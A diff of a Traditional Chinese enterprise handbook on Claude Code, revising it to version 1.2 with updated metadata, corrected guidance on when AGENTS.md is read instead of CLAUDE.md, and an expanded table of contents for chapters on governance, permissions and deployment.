@@ -19,19 +19,19 @@ categories = ['教學']
 
 | 項目 | 內容 |
 | --- | --- |
-| **文件版本** | **1.1** |
+| **文件版本** | **1.2** |
 | **初版日期** | 2026-09-10 |
-| **本版更新日期** | **2026-09-11**（v1.1 變更摘要見 [F.6](#f6-v11-變更摘要)） |
-| **最後查證日期** | **2026-09-11**（以官方文件索引 `https://code.claude.com/docs/llms.txt` 所列 **250 頁**為母體，累計逐頁覆核 **79 頁**核心頁面，其中 v1.1 新增覆核 **15 頁**，並補查官方 changelog 至 **v2.1.268**；查證清單與**未覆核項目**見附錄 F） |
+| **本版更新日期** | **2026-09-24**（v1.2 變更摘要見 [F.7](#f7-v12-變更摘要)；v1.1 見 [F.6](#f6-v11-變更摘要)） |
+| **最後查證日期** | **2026-09-24**（以官方文件索引 `https://code.claude.com/docs/llms.txt` 當日所列 **197 頁**為母體，累計逐頁覆核 **141 頁**，其中 v1.2 新增 **62 頁**、重新覆核 **15 頁**；官方 changelog 覆核至 **v2.1.281（2026-09-23）**；查證清單與**未覆核項目**見附錄 F） |
 | **官方文件站** | `https://code.claude.com/docs/en/overview` |
 | **目標產品** | Claude Code（Free / Pro / Max / Team / Enterprise 方案，以及 Claude Console API、Amazon Bedrock、Google Cloud's Agent Platform、Microsoft Foundry、Claude Platform on AWS 等 Provider） |
-| **涵蓋介面（Surface）** | Terminal CLI、VS Code、JetBrains、Desktop App、Claude Code on the web、Claude 行動 App、Slack、Chrome、GitHub Actions、GitLab CI/CD、Remote Control |
-| **涵蓋客製化機制** | CLAUDE.md、`.claude/rules/`、Auto Memory、Skills、Subagents、Agent Teams、Dynamic Workflows、Hooks、MCP、Plugins、Output Styles、Agent SDK、Advisor Tool |
-| **涵蓋治理機制** | Managed Settings（`managed-settings.json` / MDM / Server-managed）、Permission Rules、Permission Modes、Auto Mode Classifier、Sandboxing、Sandbox Environments、Managed MCP（`managedMcpServers`）、Plugin Marketplace 限制、**Corporate Launcher（`processWrapper`）**、**Deep Link 註冊控管（`disableDeepLinkRegistration`）**、**Fast Mode 組織啟用與 `fastModePerSessionOptIn`**、**Gateway 存取控管（`gatewayInternalNetworks`）**、OpenTelemetry、Analytics、Zero Data Retention |
+| **涵蓋介面（Surface）** | Terminal CLI、VS Code、JetBrains、Desktop App、Claude Code on the web（cloud session）、**Claude Projects**、Claude 行動 App、Slack、Chrome、GitHub Actions、GitLab CI/CD、Remote Control、**Self-hosted Environments** |
+| **涵蓋客製化機制** | CLAUDE.md、**AGENTS.md**、`.claude/rules/`、Auto Memory、Skills、Subagents、Agent Teams、Dynamic Workflows、Hooks、MCP、Plugins、**Plugin Evals**、Output Styles、Agent SDK、Advisor Tool、**Status Line／Keybindings** |
+| **涵蓋治理機制** | Managed Settings（`managed-settings.json` / MDM / Server-managed）、Permission Rules、Permission Modes、Auto Mode Classifier、Sandboxing、Sandbox Environments、Managed MCP（`managedMcpServers`）、Plugin Marketplace 限制、**Corporate Launcher（`processWrapper`）**、**Deep Link 註冊控管（`disableDeepLinkRegistration`）**、**Fast Mode 組織啟用與 `fastModePerSessionOptIn`**、**Gateway 存取控管（`gatewayInternalNetworks`）**、**Claude Apps Gateway 政策與 Spend Limits**、**`syncClaudeAiSkills`／`blockReadsOutsideWorkingDirectories`**、**`managed_settings_resolved` 政策遙測**、OpenTelemetry、Analytics、Zero Data Retention |
 | **範例技術棧** | Vue 3.x + TypeScript + Tailwind CSS + PrimeVue + Pinia／Angular 20 + PrimeNG + NgRx（前端）；Java 25 + Spring Boot 4.x + Maven（後端）；PostgreSQL / Oracle / DB2 / SQL Server；JUnit 5 + Testcontainers + ArchUnit + GitHub Actions |
 | **適用對象** | 資深軟體工程師、Full Stack Developer、Software Architect、AI Architect、Enterprise Architect、SA、PM、BA、QA、DevOps / SRE、DevSecOps、Security、Tech Lead、Engineering Manager |
 | **文件定位** | **實戰與維運導向**的企業標準技術白皮書；**不是** Git 入門教材，**不是** AI 概論，**不是** 官方文件翻譯 |
-| **篇幅** | 8 部、**54 章** + **7 個附錄（A–G）** |
+| **篇幅** | 8 部、**56 章** + **8 個附錄（A–H）**（v1.2 新增第 55、56 章與附錄 H，並於既有 14 章新增 50 餘個子節） |
 
 ---
 
@@ -69,7 +69,7 @@ Claude Code 在 2025–2026 年間的產品架構變動幅度極大：預設權�
 
 ### 十個必須先知道的事實與版本差異
 
-在讀任何舊教學、舊部落格文章、或任何 AI 產生的 Claude Code 教學之前，先記住這十件事。它們每一項都足以讓整篇教學寫錯，而其中 Version Note 1 與 2 是**會在管理員未採取任何動作的情況下自動改變開發者行為**的變更。
+在讀任何舊教學、舊部落格文章、或任何 AI 產生的 Claude Code 教學之前，先記住這十件事。（📌 **v1.2**：Version Note 3 已依 v2.1.277 的 AGENTS.md 原生支援全面更正；另見第 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增) 的最新變更與附錄 [H](#附錄-h2026-功能演進時間軸whats-new-w13w37) 的時間軸。）它們每一項都足以讓整篇教學寫錯，而其中 Version Note 1 與 2 是**會在管理員未採取任何動作的情況下自動改變開發者行為**的變更。
 
 > 🚨 **Version Note 1：Pro / Max / Team 方案的預設權限模式已是 `auto`（自動模式），不再是「每次都問你」**
 >
@@ -97,11 +97,23 @@ Claude Code 在 2025–2026 年間的產品架構變動幅度極大：預設權�
 >
 > `auto` 必須寫在 `~/.claude/settings.json`（使用者層）或 managed settings。其餘值（`default`、`acceptEdits`、`plan`、`dontAsk`）在任何設定檔都有效。
 
-> ⚠️ **Version Note 3：Claude Code 讀 `CLAUDE.md`，不讀 `AGENTS.md`**
+> 🚨 **Version Note 3（v1.2 全面更正）：Claude Code 自 v2.1.277 起會直接讀 `AGENTS.md`，但「有 `CLAUDE.md` 就不讀」**
 >
-> 很多跨工具的文章會說「現在大家都用 `AGENTS.md` 了」。對 Claude Code 而言**這是錯的**：Claude Code 只讀 `CLAUDE.md`。
+> 本手冊 v1.0／v1.1 記載「Claude Code 只讀 `CLAUDE.md`，不讀 `AGENTS.md`」。**這在 v2.1.277（2026-09-18）之後已不正確。**
 >
-> 若 repo 已有 `AGENTS.md`，官方建議的相容做法是建立一個 `CLAUDE.md`，第一行寫 `@AGENTS.md` 匯入它，再在下方補 Claude 專屬指示。symlink 也可行，但 **Windows 建立 symlink 需要系統管理員權限或開發者模式**，企業環境請一律改用 `@AGENTS.md` 匯入。
+> | repo 的狀態 | Claude 預設讀什麼 |
+> | --- | --- |
+> | 有 `AGENTS.md`，工作目錄及其上層**沒有** `CLAUDE.md`／`.claude/CLAUDE.md`／`CLAUDE.local.md` | `AGENTS.md` |
+> | `AGENTS.md` 與任一種 `CLAUDE.md` 並存 | **只讀 `CLAUDE.md`**（`AGENTS.md` 被忽略） |
+> | `CLAUDE.md` 內以 `@AGENTS.md` 匯入 | `CLAUDE.md`，並經匯入包含 `AGENTS.md`（不會重複載入） |
+>
+> 三個最容易出事的細節：
+>
+> 1. **個人的 `CLAUDE.local.md` 也算數**：開發者為了放個人指示而新增 `CLAUDE.local.md`，會讓 Claude **不再讀團隊共用的 `AGENTS.md`**。
+> 2. **可以用「Project instructions」設定改變行為**：`claude-md-or-agents-md`（預設）、`claude-md-and-agents-md`、`claude-md`、`managed-only`。此值**只能寫在使用者設定、`--settings` 或 managed settings**，專案層設定檔中會被忽略。
+> 3. **不是每個 session 都能讀**：v2.1.277 之前的版本、停用內建 `agents-md` plugin 的 session，以及 **v2.1.281 之前在 Bedrock 或關閉遙測的 session**，都只讀 `CLAUDE.md`。
+>
+> 🎯 **企業建議**：跨工具共用 repo 時，**仍以「`CLAUDE.md` 第一行 `@AGENTS.md`」為標準寫法**。這種寫法在所有版本與 Provider 上行為一致，也不受 `CLAUDE.local.md` 影響。**不要用 symlink**：在 Windows 上建立 symlink 需要系統管理員權限或開發者模式，而且 Git 在未啟用 `core.symlinks` 時會把它 checkout 成只有一行的純文字檔。詳見第 [14.8 節](#148-agentsmd-相容official)。
 
 > 🚨 **Version Note 4：Bash 沙箱不支援原生 Windows**
 >
@@ -131,7 +143,7 @@ Claude Code 在 2025–2026 年間的產品架構變動幅度極大：預設權�
 >
 > | 機制 | 檔案位置 | 載入時機 |
 > | --- | --- | --- |
-> | CLAUDE.md | `./CLAUDE.md`、`./.claude/CLAUDE.md`、`~/.claude/CLAUDE.md`、managed policy 路徑 | 每個 session 開始 |
+> | CLAUDE.md（及 v2.1.277+ 的 `AGENTS.md`） | `./CLAUDE.md`、`./.claude/CLAUDE.md`、`~/.claude/CLAUDE.md`、managed policy 路徑；無 `CLAUDE.md` 時為 `./AGENTS.md` | 每個 session 開始 |
 > | Rules | `.claude/rules/*.md`（可加 `paths:` frontmatter） | 每個 session，或讀到符合路徑的檔案時 |
 > | Auto Memory | `~/.claude/projects/<project>/memory/MEMORY.md` | 每個 session（前 200 行或 25KB） |
 > | Skills | `.claude/skills/<name>/SKILL.md`、`~/.claude/skills/`、plugin `skills/` | 開始載 description，使用時載全文 |
@@ -146,7 +158,13 @@ Claude Code 在 2025–2026 年間的產品架構變動幅度極大：預設權�
 >
 > 這幾個工具的概念詞彙高度重疊（agent、skill、hook、MCP、sandbox），但**設定檔位置與 schema 完全不同**。
 >
-> 唯一的例外是 Claude Code 刻意提供的匯入能力：`/init` 會讀 `.cursor/rules/`、`.cursorrules`、`.github/copilot-instructions.md`；`/import` 指令（需 v2.1.213+）可把其他 coding agent 的設定匯入。除此之外，任何「把 `.cursorrules` 改個名字就能用」的說法都是錯的。
+> 例外只有 Claude Code 刻意提供的相容能力：
+>
+> - `/init` 會讀 `.cursor/rules/`、`.cursorrules`、`.github/copilot-instructions.md`
+> - `/import` 指令（需 v2.1.213+）可以把其他 coding agent 的設定匯入
+> - v2.1.277 起可直接讀 `AGENTS.md`（條件見 Version Note 3）；但 `AGENTS.local.md`、`AGENTS.override.md` 與 `.agents/` 目錄**不會被讀取**
+>
+> 除此之外，任何「把 `.cursorrules` 改個名字就能用」的說法都是錯的。
 
 > 🚨 **Version Note 9：Code Review（GitHub 託管服務）與 `/code-review`（本機指令）是兩個不同的東西**
 >
@@ -175,114 +193,783 @@ Claude Code 在 2025–2026 年間的產品架構變動幅度極大：預設權�
 
 ## 依角色的建議入口【建議】
 
-整本手冊 52 章不需要每個人從頭讀到尾。依角色挑你的路徑：
+整本手冊 56 章不需要每個人從頭讀到尾。依角色挑你的路徑：
 
 | 角色 | 必讀 | 選讀 |
 | --- | --- | --- |
-| **第一次使用的開發者** | 第 [1](#1-claude-code-總覽與-agentic-coding-核心觀念)、[9](#9-安裝-claude-code)、[10](#10-第一次使用step-by-step)、[11](#11-cli-與-slash-commands)、[14](#14-claudemdmemoryauto-memory-與-clauderules) 章 + 附錄 [C](#附錄-cwindows-企業環境快速開始) | 附錄 [G](#附錄-g新進成員最終-checklist) |
-| **資深工程師 / Tech Lead** | 第 [1](#1-claude-code-總覽與-agentic-coding-核心觀念)、[3](#3-系統架構與-agent-loop)、[13](#13-context-window-與-token-最佳化)、[16](#16-skills)–[21](#21-plugins-與-marketplace)、[27](#27-prompt-engineering)–[29](#29-spec-driven-development-與-plan-mode)、[36](#36-code-reviewai-review--human-review) 章 | 第 [43](#43-agent-sdk-與自建企業-agent-平台) 章 |
+| **第一次使用的開發者** | 第 [1](#1-claude-code-總覽與-agentic-coding-核心觀念)、[9](#9-安裝-claude-code)、[10](#10-第一次使用step-by-step)、[11](#11-cli-與-slash-commands)、[14](#14-claudemdmemoryauto-memory-與-clauderules) 章 + 附錄 [C](#附錄-cwindows-企業環境快速開始) | 附錄 [G](#附錄-g新進成員最終-checklist)、**第 [56](#56-終端機介面無障礙與個人化v12-新增) 章（終端機與無障礙，v1.2）** |
+| **資深工程師 / Tech Lead** | 第 [1](#1-claude-code-總覽與-agentic-coding-核心觀念)、[3](#3-系統架構與-agent-loop)、[13](#13-context-window-與-token-最佳化)、[16](#16-skills)–[21](#21-plugins-與-marketplace)、[27](#27-prompt-engineering)–[29](#29-spec-driven-development-與-plan-mode)、[36](#36-code-reviewai-review--human-review) 章 | 第 [43](#43-agent-sdk-與自建企業-agent-平台) 章（v1.2 大幅擴充）、附錄 [H](#附錄-h2026-功能演進時間軸whats-new-w13w37) |
 | **Software Architect** | 第 [3](#3-系統架構與-agent-loop)、[31](#31-enterprise-architecture-與架構邊界守護)、[32](#32-clean-architecture--archunit)、[33](#33-legacy-逆向工程)、[34](#34-framework-upgrade--migration) 章 | 第 [45](#45-enterprise-ai-agent-team-設計) 章 |
 | **SA / BA / PM** | 第 [1](#1-claude-code-總覽與-agentic-coding-核心觀念)、[29](#29-spec-driven-development-與-plan-mode)、[33](#33-legacy-逆向工程)、[44](#44-ai-sdlc-與角色工作方式的改變) 章 | 第 [51](#51-prompt-library30-則) 章 |
 | **QA** | 第 [35](#35-testingtdd-與-bdd)、[36](#36-code-reviewai-review--human-review)、[42](#42-自動化hooksroutinesscheduled-taskschannels-與-headless) 章 | 第 [24](#24-ai-agent-威脅模型) 章 |
 | **DevOps / SRE** | 第 [37](#37-gitgithub-與-gitlab-工作流)–[42](#42-自動化hooksroutinesscheduled-taskschannels-與-headless) 章 | 第 [7](#7-企業部署架構providergateway-與-self-hosted)、[41](#41-observability) 章 |
-| **Security / 資安** | 第 [22](#22-permission-model-與-permission-modes)–[26](#26-secrets-與敏感資料治理)、[8](#8-enterprise-governance企業治理) 章；**[8.9](#89-corporate-launcher強制所有行程走公司啟動器official) Corporate Launcher**、**[24.9](#249-t7deep-link-與外部觸發入口official) T7 Deep Link**、**[5.13](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增) 模型 Fallback** | 第 [24](#24-ai-agent-威脅模型) 章（威脅模型） |
-| **IT / 平台管理員** | 第 [7](#7-企業部署架構providergateway-與-self-hosted)、[8](#8-enterprise-governance企業治理)、[9](#9-安裝-claude-code)、[50](#50-維運升級策略與導入-roadmap)、**[53](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)**、**[54](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)** 章 | 附錄 [D](#附錄-d指令與設定速查表) |
-| **Engineering Manager** | 第 [44](#44-ai-sdlc-與角色工作方式的改變)、[46](#46-企業-repository-標準結構與共用平台)、[50](#50-維運升級策略與導入-roadmap)、[52](#52-企業使用標準golden-workflow-與結論) 章；**[50.6](#506-官方-adoption-kitcommunications-kit-與-champion-kitofficialv11-新增) 官方 Adoption Kit** | 附錄 [B](#附錄-b各角色導入建議) |
+| **Security / 資安** | 第 [22](#22-permission-model-與-permission-modes)–[26](#26-secrets-與敏感資料治理)、[8](#8-enterprise-governance企業治理) 章；**[8.9](#89-corporate-launcher強制所有行程走公司啟動器official) Corporate Launcher**、**[24.9](#249-t7deep-link-與外部觸發入口official) T7 Deep Link**、**[5.13](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增) 模型 Fallback**；v1.2：**[22.4.1](#2241-v21269281-的權限行為變更officialv12-新增) 權限繞過修正**、**[55.2](#552--上線前的十項強化official) Self-hosted 強化** | 第 [24](#24-ai-agent-威脅模型) 章（威脅模型）、第 [43.19](#4319-安全部署隔離技術proxy-pattern-與檔案系統officialv12-新增) 節 |
+| **IT / 平台管理員** | 第 [7](#7-企業部署架構providergateway-與-self-hosted)、[8](#8-enterprise-governance企業治理)、[9](#9-安裝-claude-code)、[50](#50-維運升級策略與導入-roadmap)、**[53](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)**、**[54](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)**、**[55](#55-self-hosted-environments-部署實務v12-新增)** 章 | 附錄 [D](#附錄-d指令與設定速查表)、第 [56](#56-終端機介面無障礙與個人化v12-新增) 章 |
+| **Engineering Manager** | 第 [44](#44-ai-sdlc-與角色工作方式的改變)、[46](#46-企業-repository-標準結構與共用平台)、[50](#50-維運升級策略與導入-roadmap)、[52](#52-企業使用標準golden-workflow-與結論) 章；**[50.6](#506-官方-adoption-kitcommunications-kit-與-champion-kitofficialv11-新增) 官方 Adoption Kit**、**[50.7](#507-業界導入經驗與研究v12-新增community) 業界研究（v1.2）** | 附錄 [B](#附錄-b各角色導入建議)、附錄 [H](#附錄-h2026-功能演進時間軸whats-new-w13w37) |
 
 ---
 
 ## 目錄
 
-### 第一部　概念與架構
+> 📌 **閱讀方式**：目錄分為「部 → 章 → 節」三層，每一部都可以點選標題收合或展開，所有章節都可以直接點選跳到內文。第 53–56 章為補充章節，依主題分屬第二部與第三部，但實體位置在第 52 章之後。標示「（v1.1 新增）」「（v1.2 新增）」者為改版新增的內容。
+
+**前言**：[文件資訊](#文件資訊)、[可信度標示制度（請務必先讀）](#可信度標示制度請務必先讀)、[本手冊的引用與誠實原則](#本手冊的引用與誠實原則)、[依角色的建議入口](#依角色的建議入口建議)
+
+<details open>
+<summary><strong>第一部　概念與架構</strong>（第 1–4 章）</summary>
 
 1. [Claude Code 總覽與 Agentic Coding 核心觀念](#1-claude-code-總覽與-agentic-coding-核心觀念)
+   - [1.1 Claude Code 是什麼](#11-claude-code-是什麼official)
+   - [1.2 三個常見誤解](#12-三個常見誤解建議)
+   - [1.3 什麼是 Agentic Coding](#13-什麼是-agentic-codingofficial--建議)
+   - [1.4 Claude Code 的核心能力](#14-claude-code-的核心能力official)
+   - [1.5 適合與不適合的工作](#15-適合與不適合的工作建議)
+   - [1.6 本章實務案例](#16-本章實務案例)
+   - [1.7 本章注意事項](#17-本章注意事項)
 2. [2026 年重大變更與版本注意事項](#2-2026-年重大變更與版本注意事項)
+   - [2.1 為什麼這一章必須存在](#21-為什麼這一章必須存在建議)
+   - [2.2 權限模型的反轉](#22-權限模型的反轉official)
+   - [2.3 其他重要變更速覽](#23-其他重要變更速覽official)
+   - [2.4 如何確認你自己的版本行為](#24-如何確認你自己的版本行為official)
+   - [2.5 本章實務案例](#25-本章實務案例)
+   - [2.6 本章注意事項](#26-本章注意事項)
 3. [系統架構與 Agent Loop](#3-系統架構與-agent-loop)
+   - [3.1 整體架構圖](#31-整體架構圖official--建議)
+   - [3.2 Agent Loop 的三個階段](#32-agent-loop-的三個階段official)
+   - [3.3 內建工具總覽](#33-內建工具總覽official)
+   - [3.4 Context 是怎麼組起來的](#34-context-是怎麼組起來的official)
+   - [3.5 Context 滿了會發生什麼](#35-context-滿了會發生什麼official)
+   - [3.6 Session 是怎麼存的](#36-session-是怎麼存的official)
+   - [3.7 權限層的位置](#37-權限層的位置official)
+   - [3.8 本章實務案例](#38-本章實務案例)
+   - [3.9 本章注意事項](#39-本章注意事項)
 4. [與其他 AI Coding Agent 的能力比較](#4-與其他-ai-coding-agent-的能力比較)
+   - [4.1 定位差異：一句話版本](#41-定位差異一句話版本建議)
+   - [4.2 Claude Code 與 Claude Chat 的差異](#42-claude-code-與-claude-chat-的差異official)
+   - [4.3 能力矩陣](#43-能力矩陣)
+   - [4.4 選型決策矩陣](#44-選型決策矩陣建議)
+   - [4.5 一個常被忽略的落差：Provider 會影響功能可用性](#45-一個常被忽略的落差provider-會影響功能可用性official)
+   - [4.6 本章實務案例](#46-本章實務案例)
+   - [4.7 本章注意事項](#47-本章注意事項)
 
-### 第二部　授權、部署與企業治理
+</details>
+
+<details open>
+<summary><strong>第二部　授權、部署與企業治理</strong>（第 5–8 章）</summary>
 
 5. [方案、模型選擇與成本模型](#5-方案模型選擇與成本模型)
+   - [5.1 方案總覽](#51-方案總覽official)
+   - [5.2 模型與別名](#52-模型與別名official)
+   - [5.3 模型設定的優先順序](#53-模型設定的優先順序official)
+   - [5.4 Effort Level（推理投入程度）](#54-effort-level推理投入程度official)
+   - [5.5 企業模型治理](#55-企業模型治理official)
+   - [5.6 成本模型與實測區間](#56-成本模型與實測區間official)
+   - [5.7 查看與控管成本](#57-查看與控管成本official)
+   - [5.8 Console（API）組織的速率限制建議值](#58-consoleapi組織的速率限制建議值official)
+   - [5.9 降低 Token 用量的十個做法](#59-降低-token-用量的十個做法official--建議)
+   - [5.10 長 session 用量爆增的原因](#510-長-session-用量爆增的原因official)
+   - [5.11 Fast Mode（高速模式）](#511-fast-mode高速模式preview)
+   - [5.12 Advisor Tool（顧問模型）](#512-advisor-tool顧問模型preview)
+   - [5.13 🚨 Automatic Model Fallback（內容觸發的自動換模型）（v1.1 新增）](#513--automatic-model-fallback內容觸發的自動換模型officialv11-新增)
+   - [5.14 本章實務案例](#514-本章實務案例)
+   - [5.15 本章注意事項](#515-本章注意事項)
 6. [執行環境（Surface）全比較](#6-執行環境surface全比較)
+   - [6.1 六個 Surface 一覽](#61-六個-surface-一覽official)
+   - [6.2 決策矩陣](#62-決策矩陣建議)
+   - [6.3 VS Code 擴充](#63-vs-code-擴充official)
+   - [6.4 JetBrains Plugin](#64-jetbrains-pluginofficial)
+   - [6.5 Desktop App](#65-desktop-appofficial)
+   - [6.6 Claude Code on the web（雲端 session）](#66-claude-code-on-the-web雲端-sessionpreview)
+   - [6.7 Remote Control](#67-remote-controlofficial)
+   - [6.8 離開座位時的工作方式比較](#68-離開座位時的工作方式比較official)
+   - [6.9 Computer Use（螢幕控制）](#69-computer-use螢幕控制preview)
+   - [6.10 本章實務案例](#610-本章實務案例)
+   - [6.11 本章注意事項](#611-本章注意事項)
 7. [企業部署架構：Provider、Gateway 與 Self-hosted](#7-企業部署架構providergateway-與-self-hosted)
+   - [7.1 部署決策的五個問題](#71-部署決策的五個問題official--建議)
+   - [7.2 Q1：選擇 API Provider](#72-q1選擇-api-providerofficial)
+   - [7.3 Q2：政策交付機制](#73-q2政策交付機制official)
+   - [7.4 Q3：企業該強制什麼](#74-q3企業該強制什麼official--建議)
+   - [7.5 企業基準政策範本](#75-企業基準政策範本建議)
+   - [7.6 網路設定](#76-網路設定official)
+   - [7.7 Self-hosted Environments](#77-self-hosted-environmentspreview)
+   - [7.8 Cloud Environments（雲端環境設定）](#78-cloud-environments雲端環境設定preview)
+   - [7.9 Dev Container 與其他隔離方式](#79-dev-container-與其他隔離方式official)
+   - [7.10 本章實務案例](#710-本章實務案例)
+   - [7.11 本章注意事項](#711-本章注意事項)
 8. [Enterprise Governance（企業治理）](#8-enterprise-governance企業治理)
+   - [8.1 治理模型全景](#81-治理模型全景建議)
+   - [8.2 身分與登入強制](#82-身分與登入強制official)
+   - [8.3 擴充機制治理：最容易被忽略的攻擊面](#83-擴充機制治理最容易被忽略的攻擊面official)
+   - [8.4 MCP 治理](#84-mcp-治理official)
+   - [8.5 稽核：ConfigChange Hook](#85-稽核configchange-hookofficial--建議)
+   - [8.6 版本控管與強制升級](#86-版本控管與強制升級official)
+   - [8.7 資料治理](#87-資料治理official)
+   - [8.8 驗證政策是否生效](#88-驗證政策是否生效official)
+   - [8.9 Corporate Launcher：強制所有行程走公司啟動器](#89-corporate-launcher強制所有行程走公司啟動器official)
+   - [8.10 本章實務案例](#810-本章實務案例)
+   - [8.11 本章注意事項](#811-本章注意事項)
 
-**本部的補充章節（v1.1 新增，內文位於第 52 章之後）：**
+> 📌 **本部的補充章節**（實體位置在第 52 章之後）：第 53 章 [企業 Gateway 架構：LLM Gateway 與 Claude Apps Gateway](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)；第 54 章 [Provider 專頁深化：Bedrock / Claude Platform on AWS / Vertex / Foundry](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)；第 55 章 [Self-hosted Environments 部署實務（v1.2 新增）](#55-self-hosted-environments-部署實務v12-新增)
 
-53. [企業 Gateway 架構：LLM Gateway 與 Claude Apps Gateway](#53-企業-gateway-架構llm-gateway-與-claude-apps-gateway)
-54. [Provider 專頁深化：Bedrock / Claude Platform on AWS / Vertex / Foundry](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry)
+</details>
 
-### 第三部　安裝與基本操作
+<details open>
+<summary><strong>第三部　安裝與基本操作</strong>（第 9–13 章）</summary>
 
 9. [安裝 Claude Code](#9-安裝-claude-code)
+   - [9.1 安裝方式總覽](#91-安裝方式總覽official)
+   - [9.2 Windows 安裝（企業重點）](#92-windows-安裝企業重點official)
+   - [9.3 WSL 安裝](#93-wsl-安裝official)
+   - [9.4 macOS 與 Linux 安裝](#94-macos-與-linux-安裝official)
+   - [9.5 IDE 與 Desktop 安裝](#95-ide-與-desktop-安裝official)
+   - [9.6 驗證安裝](#96-驗證安裝official)
+   - [9.7 首次登入](#97-首次登入official)
+   - [9.8 移除與重裝](#98-移除與重裝official)
+   - [9.9 本章實務案例](#99-本章實務案例)
+   - [9.10 本章注意事項](#910-本章注意事項)
 10. [第一次使用：Step-by-Step](#10-第一次使用step-by-step)
+    - [10.1 完整的十二步](#101-完整的十二步建議)
+    - [10.2 逐步操作](#102-逐步操作official--建議)
+    - [10.3 第一天的檢核表](#103-第一天的檢核表建議)
+    - [10.4 本章實務案例](#104-本章實務案例)
+    - [10.5 本章注意事項](#105-本章注意事項)
 11. [CLI 與 Slash Commands](#11-cli-與-slash-commands)
+    - [11.1 CLI 指令總覽](#111-cli-指令總覽official)
+    - [11.2 常用旗標](#112-常用旗標official)
+    - [11.3 Slash Commands 分類速查](#113-slash-commands-分類速查official)
+    - [11.4 互動模式的關鍵操作](#114-互動模式的關鍵操作official)
+    - [11.5 非互動模式（Headless）](#115-非互動模式headlessofficial)
+    - [11.6 本章實務案例](#116-本章實務案例)
+    - [11.7 本章注意事項](#117-本章注意事項)
 12. [Session 管理、Checkpoint 與跨裝置接續](#12-session-管理checkpoint-與跨裝置接續)
+    - [12.1 Session 是什麼](#121-session-是什麼official)
+    - [12.2 續接 Session](#122-續接-sessionofficial)
+    - [12.3 Fork / Branch：分岔嘗試](#123-fork--branch分岔嘗試official)
+    - [12.4 命名 Session](#124-命名-sessionofficial--建議)
+    - [12.5 Session 選擇器快捷鍵](#125-session-選擇器快捷鍵official)
+    - [12.6 Checkpoint 與 Rewind](#126-checkpoint-與-rewindofficial)
+    - [12.7 跨裝置接續](#127-跨裝置接續official)
+    - [12.8 Transcript 儲存位置](#128-transcript-儲存位置official)
+    - [12.9 本章實務案例](#129-本章實務案例)
+    - [12.10 本章注意事項](#1210-本章注意事項)
 13. [Context Window 與 Token 最佳化](#13-context-window-與-token-最佳化)
+    - [13.1 Context 裡有什麼](#131-context-裡有什麼official)
+    - [13.2 Prompt Cache：省錢的關鍵機制](#132-prompt-cache省錢的關鍵機制official)
+    - [13.3 檢查快取表現](#133-檢查快取表現official)
+    - [13.4 十個降低 Token 用量的做法](#134-十個降低-token-用量的做法official--建議)
+    - [13.5 Monorepo 的 Context 策略](#135-monorepo-的-context-策略official)
+    - [13.6 Context 管理指令對照](#136-context-管理指令對照official--建議)
+    - [13.7 本章實務案例](#137-本章實務案例)
+    - [13.8 本章注意事項](#138-本章注意事項)
 
-### 第四部　客製化與擴充機制
+> 📌 **本部的補充章節**（實體位置在第 52 章之後）：第 56 章 [終端機介面、無障礙與個人化（v1.2 新增）](#56-終端機介面無障礙與個人化v12-新增)
+
+</details>
+
+<details open>
+<summary><strong>第四部　客製化與擴充機制</strong>（第 14–21 章）</summary>
 
 14. [CLAUDE.md、Memory、Auto Memory 與 .claude/rules/](#14-claudemdmemoryauto-memory-與-clauderules)
+    - [14.1 兩套記憶系統](#141-兩套記憶系統official)
+    - [14.2 CLAUDE.md 的位置與優先順序](#142-claudemd-的位置與優先順序official)
+    - [14.3 CLAUDE.md 的三個硬性限制](#143-claudemd-的三個硬性限制official)
+    - [14.4 該放什麼、不該放什麼](#144-該放什麼不該放什麼official)
+    - [14.5 撰寫原則](#145-撰寫原則official)
+    - [14.6 企業標準 CLAUDE.md 範本](#146-企業標準-claudemd-範本建議)
+    - [14.7 匯入其他檔案](#147-匯入其他檔案official)
+    - [14.8 AGENTS.md 相容](#148-agentsmd-相容official)
+    - [14.9 `.claude/rules/`：讓 CLAUDE.md 保持精簡](#149-clauderules讓-claudemd-保持精簡official)
+    - [14.10 per-directory CLAUDE.md vs. path-scoped rules](#1410-per-directory-claudemd-vs-path-scoped-rulesofficial)
+    - [14.11 Auto Memory](#1411-auto-memoryofficial)
+    - [14.12 管理大型團隊的 CLAUDE.md](#1412-管理大型團隊的-claudemdofficial)
+    - [14.13 排錯：Claude 不遵守我的 CLAUDE.md](#1413-排錯claude-不遵守我的-claudemdofficial)
+    - [14.14 `/compact` 之後會遺失什麼](#1414-compact-之後會遺失什麼official)
+    - [14.15 Output Styles：改的是「怎麼回答」，不是「知道什麼」](#1415-output-styles改的是怎麼回答不是知道什麼official)
+    - [14.16 本章實務案例](#1416-本章實務案例)
+    - [14.17 本章注意事項](#1417-本章注意事項)
 15. [.claude 目錄結構與 Settings 優先權](#15-claude-目錄結構與-settings-優先權)
+    - [15.1 Settings 優先權](#151-settings-優先權official)
+    - [15.2 完整的 .claude 目錄結構](#152-完整的-claude-目錄結構official--建議)
+    - [15.3 各層該放什麼](#153-各層該放什麼建議)
+    - [15.4 設定何時生效](#154-設定何時生效official)
+    - [15.5 `--setting-sources`：精確控制載入來源](#155---setting-sources精確控制載入來源official)
+    - [15.6 排錯：設定沒生效](#156-排錯設定沒生效official)
+    - [15.7 v1.2 新增的企業相關設定](#157-v12-新增的企業相關設定official)
+    - [15.8 本章實務案例](#158-本章實務案例)
+    - [15.9 本章注意事項](#159-本章注意事項)
 16. [Skills](#16-skills)
+    - [16.1 Skill 是什麼](#161-skill-是什麼official)
+    - [16.2 Skill vs. 其他機制](#162-skill-vs-其他機制official)
+    - [16.3 Skill 的位置與優先權](#163-skill-的位置與優先權official)
+    - [16.4 SKILL.md 的 Frontmatter 欄位](#164-skillmd-的-frontmatter-欄位official)
+    - [16.5 控制誰能叫用](#165-控制誰能叫用official)
+    - [16.6 內建 Skills](#166-內建-skillsofficial)
+    - [16.7 參數與變數替換](#167-參數與變數替換official)
